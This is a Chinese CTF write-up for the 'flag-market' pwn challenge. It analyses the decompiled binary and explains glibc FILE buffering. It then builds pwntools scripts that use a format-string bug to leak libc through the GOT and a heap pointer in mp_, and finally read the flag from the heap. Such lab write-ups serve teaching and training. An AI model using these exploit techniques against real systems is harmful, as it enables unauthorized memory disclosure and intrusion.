---
title: 第九届强网杯线上赛Pwn_flag-market
categories: [CTF, 比赛, WP, Pwn]
tag: ["fmt格式化字符串漏洞", "任意地址读取","泄露libc基址", "IO_FILE", "堆"]
cover: /img/cover.png
date: 2025-10-25 21:05:00          
updated: 2025-10-25 21:05:00     
---
# 第九届强网杯线上赛PWN_flag-market

## 一、题目

[![img](/img/flag-market/3622178-20251023203039923-1200912138.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203039923-1200912138.png)

## 二、信息搜集

下载题目给的附件，查看文件ctf.xinetd之后，知道我们的可执行程序名为chall：

[![img](/img/flag-market/3622178-20251023203727187-200295548.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203727187-200295548.png)

这个文件在附件中的bin目录下。

通过`file`命令查看文件类型：

[![image](/img/flag-market/3622178-20251023203957917-176528406.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203957917-176528406.png)

通过`checksec`命令查看文件保护措施：

[![image](/img/flag-market/3622178-20251023204015264-1836719827.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023204015264-1836719827.png)

## 三、反汇编文件开始分析

### 1、分析程序基本逻辑

将chall文件丢入64位的IDA Pro中，开始反汇编操作，由于汇编代码过长，我们通过看C语言代码来把握整体代码逻辑：

```c
__int64 __usercall main@<rax>(char **a1@<rsi>, char **a2@<rdx>, __int64 a3@<rbp>, __int64 a4@<rdi>)
{
  __int64 *v4; // rsi
  const char *v5; // rdi
  __int64 result; // rax
  unsigned int v7; // eax
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rt1
  signed int i; // [rsp-8Ch] [rbp-8Ch]
  __int64 v11; // [rsp-80h] [rbp-80h]
  signed int v12; // [rsp-71h] [rbp-71h]
  signed __int16 v13; // [rsp-6Dh] [rbp-6Dh]
  __int64 v14; // [rsp-68h] [rbp-68h]
  __int64 v15; // [rsp-58h] [rbp-58h]
  unsigned __int64 v16; // [rsp-10h] [rbp-10h]
  __int64 v17; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v17 = a3;
  v16 = __readfsqword(0x28u);
  sub_401336(a4, a1, a2);
  v12 = 'alf/';
  v13 = 'g';
  v11 = my_fopen(&v12, &unk_402008);
  dword_40430C = 1;
  while ( 1 )
  {
    my_puts("welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit");
    my_memset(&v14, 0LL, 16LL);
    v4 = &v14;
    my_read();
    if ( (unsigned __int8)my_atoi() != 1 )
      break;
    my_puts("how much you want to pay?");
    my_memset(&v14, 0LL, 16LL);
    v4 = &v14;
    my_read();
    if ( (unsigned __int8)my_atoi() == -1 )
    {
      my_puts(aThankYouForPay);
      if ( !dword_40430C || (v4 = (__int64 *)64, !my_fgets(&v15, 64LL, v11)) )
      {
        v5 = "something is wrong";
        my_puts("something is wrong");
        result = 0LL;
        goto LABEL_16;
      }
      for ( i = 0; ; ++i )
      {
        if ( i > 64 )
        {
          v5 = "\nThank you for your patronage!";
          my_puts("\nThank you for your patronage!");
          result = 0LL;
          goto LABEL_16;
        }
        if ( *((_BYTE *)&v17 + i - 80) == '{' )
          break;
        my_putchar((unsigned int)*((char *)&v17 + i - 80));
        my_sleep(1LL);
      }
      my_memset(&v15, 0LL, 64LL);
      my_puts(a1m31mError0mSo);
      my_puts("opened user.log, please report:");
      my_memset(aEverythingIsOk, 0LL, 256LL);
      scanf("%s", aEverythingIsOk);
      my_getchar("%s", aEverythingIsOk);
      v7 = my_open("user.log");
      my_write(v7, aEverythingIsOk, 256LL);
      my_puts(aOkNowYouCanExi);
    }
    else
    {
      my_printf(aYouAreSoParsim);
      if ( dword_40430C )
      {
        my_fclose(v11);
        dword_40430C = 0;
      }
    }
  }
  v5 = 0LL;
  result = my_exit();
LABEL_16:
  v9 = __readfsqword(0x28u);
  v8 = v16 - v9;
  if ( v16 != v9 )
    result = my___stack_chk_fail(v5, v4, v8);
  return result;
}
```

> 我已经将一些为命令函数进行了重命名操作，这样便于我们的分析。重命名可以依据经验，也可以通过gdb动态调试来确定函数。

程序首先会通过`fopen`函数打开根目录下的flag文件，接着会出现两个选择即：

- take my money
- exit

选择二就直接退出了。

如果我们选择一，那么程序就会通过`read`函数来获取你的输入，接着判断你输入的值是否是“-1”：

- 是：将打开的flag文件中的内容写入到地址&v15处，然后通过for循环逐字节读取flag。但是，遇到“{”之后就会终止读取。接下来，就是一个向上汇报错误的过程。
- 不是：打印一段文字，然后关闭（`fclose`）打开的flag文件。

很明显，这一部分出现`printf`函数，而且该函数并没有指定格式化字符，那么会不会存在格式化字符串漏洞？

### 2、格式化字符串漏洞

`printf`的参数来自`.data`段：

```assembly
.data:00000000004041C0 aYouAreSoParsim db 'You are so parsimonious!!!',0
```

如果我们能控制这一部分的数据，就可以造成格式化字符串漏洞。

观察后，可以发现我们的`scanf`函数用的格式化字符是`%s`即可以无限长地输入（只要不输入空白字符），而且输入的位置刚好也在`.data`段且位置比“aYouAreSoParsim”低：

```assembly
.data:00000000004040C0 aEverythingIsOk db 'everything is ok~',0
```

那么，格式化字符串漏洞的触发就是通过`scanf`函数的输入来覆盖“aYouAreSoParsim”部分，接着通过`printf`函数实现漏洞的触发。

### 3、思路

找到了关键漏洞，我们就要理一下思路，即思考我该怎么做才能获得flag？

首先，我们肯定不能通过任意地址读来去栈上找flag，因为虽然flag被写在了栈上，但是，后续程序利用了`my_memset(&v15, 0LL, 64LL);`将该位置的信息全都清空了。

但是，堆上的flag呢？

可能有人会有疑惑，堆上哪来的flag，整个程序我都没见过堆操作。

其实是有的。简单来说，I/O类型的函数（如`fopen`，`fgets`等）为了提到效率，会用到“缓冲”机制，这个缓冲机制就是通过调用`malloc`来实现的。

让我们从一个简单的场景开始，逐步深入。

场景：如果没有缓冲会怎样？

想象一下，你的程序要从一个文件中读取1MB（大约一百万字节）的数据。

```c
FILE *fp = fopen("large_file.txt", "r");
for (int i = 0; i < 1000000; i++) {
    fgetc(fp); // 一次只读一个字节
}
```

如果没有缓冲机制，`fgetc`的每一次调用都会触发一次系统调用。系统调用是程序从用户态切换到内核态去请求操作系统服务的唯一方式。这个切换过程涉及到上下文保存、权限检查等，开销非常大。

这意味着，为了读取1MB的数据，你的程序需要进行一百万次的用户态/内核态切换。这将会慢得令人无法忍受。

为了解决这个问题，C标准库（glibc）引入了缓冲机制。

假设，当你的程序第一次调用`fopen`打开一个文件时，会发生以下事情：

1. **创建管理结构**：`fopen`在内部会调用`malloc`来开辟一片空间，这片空间中会存放一个叫`FILE`的结构体（或`_IO_FILE_plus`），该结构体用来管理：
   - 文件的描述符（操作系统给的一个数字）。
   - 当前读写位置。
   - 是否发生了错误。
   - 指向缓冲区的指针。
2. **分配I/O缓冲区**：光有管理结构还不够，还需要一个地方来存放从文件里预读出来的数据。这个地方就是I/O缓冲区。
   - 当你的程序第一次尝试从文件读取数据时（例如，第一次调用`fgetc`或`fgets`），`_IO_FILE`的内部逻辑会检查自己是否有缓冲区。
   - 如果没有，它就会向内核申请一大块数据，即此时第二次调用了`malloc`。
   - 然后，就是读的操作了（它会发出一次系统调用如`read`），让内核一次性把数据从文件填充到这个新分配的缓冲区里。
   - 最后，读写函数会从这片缓冲区中操作数据。

在完成了上述初始化之后，后续的I/O操作就变得非常高效了：

- `fgetc`的调用，将不再需要任何系统调用。它们只是简单地从那个已经填满数据的堆上缓冲区里，一个接一个地取出字节。这只是纯粹的内存操作，速度极快。
- 只有当缓冲区里的数据被全部读完后，下一次读取操作才会再次触发一次系统调用，去请求下一个数据块。

对于写入操作（如`fprintf`, `fputc`），原理也是类似的，这里不再赘述。

好，了解了这些之后，我们应该知道，堆上为什么也会有flag了吧。

那么，我们的思路就是，利用格式化字符串漏洞，实现任意地址读取，读到堆上的flag。

问题又出现了，怎么知道堆的地址呢？

这又涉及到一个知识点：针对动态链接的程序，在他的libc库中，会存在指向IO缓冲区的指针。

> 这也很好理解，libc库中有很多的IO函数，那么操作一块堆空间最好的方式就是给我一个指向它的指针。

综上，我们的思路：

1. 格式化字符串漏洞泄露libc基址。
2. 通过格式化字符串漏洞泄露堆上的flag。

## 四、Poc的构造

> 根据思路，按部就班地完成Poc的构造。

### 1、泄露libc基址

首先分析栈上的构造，程序中的第二个read函数的输入位置为`[rbp-60h]`。

flag在栈上的临时位置在`[rbp-50h]`他们的关系就是：

[![img](/img/flag-market/3622178-20251023213430288-1118781673.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023213430288-1118781673.png)

写一个测试脚本：

```python
from pwn import *

context(arch="amd64",os="linux",log_level="debug")

# p = remote("127.0.0.1",9999)

p = process("./chall")

p.sendafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'-1'.ljust(8,b'\x00'))

padding = 0x100

payload = b'A'*padding

for i in range(1,50):
    payload += f'%{i}$p-'.encode()

p.sendlineafter(b'opened user.log, please report:',payload)

p.sendlineafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'2'.ljust(8,b'\x00') + p64(0x404050))

p.interactive()
```

可以看到，运行之后可以看到（关键部分）：

```bash
0x2-(nil)-0x7ffd2c748851-0x1999999999999999-(nil)-0xc000-0x402b00000-0xffffffff00000010-0x27c212a0-0x2f0000000000c000-0x7f0067616c66-0x32-0x404050-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x7ffd2c748990-0x8988df52354d0500-0x7ffd2c748950-0x7e84d7c2a1ca-0x7ffd2c748900-0x7ffd2c7489d8-0x100400040-0x40139b-0x7ffd2c7489d8-0x9a34b258d05c60e2-0x1-(nil)-0x403e18-0x7e84d800c000-0x9a34b258d37c60e2-0x98c7453481fe60e2-0x7ffd00000000-(nil)-(nil)-0x1-0x7ffd2c7489d0-0x8988df52354d0500-0x7ffd2c7489b0-0x7e84d7c2a28b-0x7ffd2c7489e8-0x403e18-0x7ffd2c7489e8-0x40139b-welcome to flag market!
```

很明显，这连续的`(nil)`就是`my_memset(&v15, 0LL, 64LL);`的杰作。

因此，我们可以推断，第14个位置就是`[rbp-50h]`

那么，我们可以通过和`read`输入的配合，实现：

[![img](/img/flag-market/3622178-20251023214316077-107934784.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023214316077-107934784.png)

本阶段Poc:

```python
from pwn import *

context(arch="amd64",os="linux",log_level="debug")

# p = remote("127.0.0.1",9999)

p = process("./chall")

p.sendafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'-1'.ljust(8,b'\x00'))

padding = 0x100

payload = b'A'*padding + b'%13$s#'

# for i in range(1,50):
#     payload += f'%{i}$p-'.encode()

p.sendlineafter(b'opened user.log, please report:',payload)

p.sendlineafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'2'.ljust(8,b'\x00') + p64(0x404050))

p.recvline()
leak = u64(p.recvuntil(b'#')[:-1].ljust(8,b'\x00'))
success("read_addr:" + hex(leak))

libc_base = leak - 0x11ba80
```

其中，`p64(0x404050)`是read@got的地址：

```assembly
.got.plt:0000000000404050 off_404050      dq offset sub_4010A0    ; DATA XREF: my_read+4↑r
```

`0x11ba80`，这个偏移量，是`read`在libc.so.6中的偏移量，为什么选择这个？

在上述Poc的输出中，会输出泄露的`read`的真实地址：

```bash
[+] read_addr:0x78a9a251ba80
```

拿这个地址去[网站](https://libc.blukat.me/)上搜索一下

[![image](/img/flag-market/3622178-20251023215019295-212912469.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215019295-212912469.png)

接着问AI：

[![image](/img/flag-market/3622178-20251023215116586-1271645686.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215116586-1271645686.png)

然后在网站上点击该库文件即可看到偏移量：

[![image](/img/flag-market/3622178-20251023215157409-635275790.png)](https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215157409-635275790.png)

### 2、找指向缓冲区的指针

我们通过gdb的find命令，就可以很容易找到在libc中指向缓冲区的指针

为了程序的顺利执行，我们需要在我们的虚拟器的根目录下创建一个flag文件。原因很简单，我们之前分析过，程序会打开根目录下的flag文件，如果没有找到，就会报错。

我这已经准备好了：

```bash
(pwn-env) zyf@zhengyifeng:/mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin$ cat /flag
flag{0ec285cb-c1b3-49ff-820b-8075a639bc1e}
```

gdb打开程序，将断点设置在`0x4015B3`

> 断点没硬性要求，但是需要在建立缓冲区之后，即`fgets`之后。

通过`got`命令找到read的真实地址：

```bash
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin/chall:
GOT protection: Partial RELRO | Found 17 GOT entries passing the filter
[0x404018] putchar@GLIBC_2.2.5 -> 0x7ffff7c89ce0 (putchar) ◂— endbr64
[0x404020] puts@GLIBC_2.2.5 -> 0x7ffff7c87be0 (puts) ◂— endbr64
[0x404028] write@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
[0x404030] fclose@GLIBC_2.2.5 -> 0x401060 ◂— endbr64
[0x404038] __stack_chk_fail@GLIBC_2.4 -> 0x401070 ◂— endbr64
[0x404040] printf@GLIBC_2.2.5 -> 0x401080 ◂— endbr64
[0x404048] memset@GLIBC_2.2.5 -> 0x7ffff7d89440 (__memset_avx2_unaligned_erms) ◂— endbr64
[0x404050] read@GLIBC_2.2.5 -> 0x7ffff7d1ba80 (read) ◂— endbr64
[0x404058] fgets@GLIBC_2.2.5 -> 0x7ffff7c85b30 (fgets) ◂— endbr64
[0x404060] getchar@GLIBC_2.2.5 -> 0x4010c0 ◂— endbr64
[0x404068] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c88550 (setvbuf) ◂— endbr64
[0x404070] open@GLIBC_2.2.5 -> 0x4010e0 ◂— endbr64
[0x404078] fopen@GLIBC_2.2.5 -> 0x7ffff7c85e60 (fopen64) ◂— endbr64
[0x404080] atoi@GLIBC_2.2.5 -> 0x7ffff7c46660 (atoi) ◂— endbr64
[0x404088] __isoc99_scanf@GLIBC_2.7 -> 0x401110 ◂— endbr64
[0x404090] exit@GLIBC_2.2.5 -> 0x401120 ◂— endbr64
[0x404098] sleep@GLIBC_2.2.5 -> 0x7ffff7d0ec50 (sleep) ◂— endbr64
```

算出libc的基址：

```bash
pwndbg> p/x $libc_base =  0x7ffff7d1ba80 - 0x11ba80
$1 = 0x7ffff7c00000
```

接下来，我们可以先在堆上找到flag的准确位置

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x1e0 (with flag bits: 0x1e1)

Allocated chunk | PREV_INUSE
Addr: 0x405470
Size: 0x1010 (with flag bits: 0x1011)

Top chunk | PREV_INUSE
Addr: 0x406480
Size: 0x1fb80 (with flag bits: 0x1fb81)

pwndbg> telescope 0x405000 0x500
00:0000│      0x405000 ◂— 0
01:0008│      0x405008 ◂— 0x291
02:0010│      0x405010 ◂— 0
... ↓         80 skipped
53:0298│      0x405298 ◂— 0x1e1
54:02a0│      0x4052a0 ◂— 0xfbad2488
55:02a8│      0x4052a8 —▸ 0x4054ab ◂— 0
56:02b0│      0x4052b0 —▸ 0x4054ab ◂— 0
57:02b8│      0x4052b8 —▸ 0x405480 ◂— 'flag{0ec285cb-c1b3-49ff-820b-8075a639bc1e}\n'
... ↓         4 skipped
5c:02e0│      0x4052e0 —▸ 0x406480 ◂— 0
5d:02e8│      0x4052e8 ◂— 0
... ↓         3 skipped
61:0308│      0x405308 —▸ 0x7ffff7e044e0 (_IO_2_1_stderr_) ◂— 0xfbad2087
62:0310│      0x405310 ◂— 3
63:0318│      0x405318 ◂— 0
64:0320│      0x405320 ◂— 0
65:0328│      0x405328 —▸ 0x405380 ◂— 0
66:0330│      0x405330 ◂— 0xffffffffffffffff
67:0338│      0x405338 ◂— 0
68:0340│      0x405340 —▸ 0x405390 ◂— 0
69:0348│      0x405348 ◂— 0
... ↓         2 skipped
6c:0360│      0x405360 ◂— 0xffffffff
6d:0368│      0x405368 ◂— 0
6e:0370│      0x405370 ◂— 0
6f:0378│      0x405378 —▸ 0x7ffff7e02030 (_IO_file_jumps) ◂— 0
70:0380│      0x405380 ◂— 0
... ↓         29 skipped
8e:0470│      0x405470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 0
8f:0478│      0x405478 ◂— 0x1011
90:0480│      0x405480 ◂— 'flag{0ec285cb-c1b3-49ff-820b-8075a639bc1e}\n'
91:0488│      0x405488 ◂— '285cb-c1b3-49ff-820b-8075a639bc1e}\n'
92:0490│      0x405490 ◂— 'b3-49ff-820b-8075a639bc1e}\n'
93:0498│      0x405498 ◂— '820b-8075a639bc1e}\n'
94:04a0│      0x4054a0 ◂— '5a639bc1e}\n'
95:04a8│ r8-3 0x4054a8 ◂— 0xa7d65 /* 'e}\n' */
96:04b0│      0x4054b0 ◂— 0
... ↓         506 skipped
291:1488│      0x406488 ◂— 0x1fb81
292:1490│      0x406490 ◂— 0
... ↓         621 skipped
pwndbg>
```

很明显，最低在`0x4052b8`就出现了。

现在，我们就可以通过`find`命令找到那个指针了：

> 注意，不要直接找flag所在的位置，要找flag所在的那个chunk的位置，因为指针指向的是chunk的位置而不是flag的位置。

```bash
pwndbg> find /g $libc_base,$libc_base+0x400000,0x405000
0x7ffff7e031e0 <mp_+96>
warning: Unable to access 16000 bytes of target memory at 0x7ffff7e0ed68, halting search.
1 pattern found.
```

找到的`0x7ffff7e031e0 <mp_+96>`是在libc中的，而且我们已经泄露了libc的地址。那么，我们就可以通过格式化字符串漏洞的任意地址读泄露`0x7ffff7e031e0`中的内容即堆指针。但是，此时泄露出来的信息是chunk的地址，因此，为了准确定位flag，我们还得知道偏移量即`0x480`

### 3、最终Poc

```python
from pwn import *

context(arch="amd64",os="linux",log_level="debug")

# p = remote("127.0.0.1",9999)

p = process("./chall")

p.sendafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'-1'.ljust(8,b'\x00'))

padding = 0x100

payload = b'A'*padding + b'%13$s#'

# for i in range(1,50):
#     payload += f'%{i}$p-'.encode()

p.sendlineafter(b'opened user.log, please report:',payload)

p.sendlineafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'2'.ljust(8,b'\x00') + p64(0x404050))

p.recvline()
leak = u64(p.recvuntil(b'#')[:-1].ljust(8,b'\x00'))
success("read_addr:" + hex(leak))

libc_base = leak - 0x11ba80

success("libc_base:" + hex(libc_base))

p.sendafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'2'.ljust(8,b'\x00') + p64(libc_base+0x2031e0+1))

p.recvline()
heap_addr = u64(p.recvuntil(b'#')[:-1].ljust(8,b'\x00')) << 8
success("heap_addr:" + hex(heap_addr))

# gdb.attach(p)
# pause()

p.sendafter(b'2.exit',b'1')

p.sendafter(b'how much you want to pay?',b'2'.ljust(8,b'\x00') + p64(heap_addr+0x480))

p.interactive()
```

需要注意的是，我们在动态调试中找到的那个指针：

```bash
pwndbg> telescope 0x7ffff7e031e0
00:0000│     0x7ffff7e031e0 (mp_+96) —▸ 0x405000 ◂— 0
```

在小端序中，其最低地址字节是"\x00"，这就会导致我们构造的格式化字符串"%s"直接戛然而止。

因此，我们可以通过"地址+1"的手段，来跳过该空字符，然后泄露地址完成之后，通过左移1字节（8位）的操作（对应脚本`<< 8`），实现最低有效位（`\x00`）的补回。

最终Poc的执行效果（关键部分）：

```bash
[DEBUG] Received 0x82 bytes:
    b'flag{0ec285cb-c1b3-49ff-820b-8075a639bc1e}\n'
    b'#welcome to flag market!\n'
    b'give me money to buy my flag,\n'
    b'choice: \n'
    b'1.take my money\n'
    b'2.exit\n'
flag{0ec285cb-c1b3-49ff-820b-8075a639bc1e}
#welcome to flag market!
give me money to buy my flag,
choice:
1.take my money
2.exit
```

可以看到flag被我们泄露出来了~
